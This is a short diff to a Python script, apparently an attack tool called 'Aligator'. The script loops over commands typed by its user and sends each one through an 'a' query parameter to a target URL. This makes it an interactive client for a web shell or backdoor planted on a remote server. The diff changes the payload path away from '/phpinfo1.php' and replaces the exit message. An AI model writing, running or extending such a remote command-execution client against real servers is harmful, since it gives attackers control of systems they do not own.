@@ -21,7 +21,7 @@ print()
 while True:
     
       try:
-          payload ='/phpinfo1.php?a='
+          payload ='?a='
           command = input("Execute Commands: ")
           r = requests.get(url + payload + command)
           r.raise_for_status()
@@ -29,6 +29,6 @@ while True:
           if command == "exit":
               exit()
       except:
-           print("########### BHAG BHDK #############")
+           print("########### Thanks For Using Aligator. #############")
            exit()
         
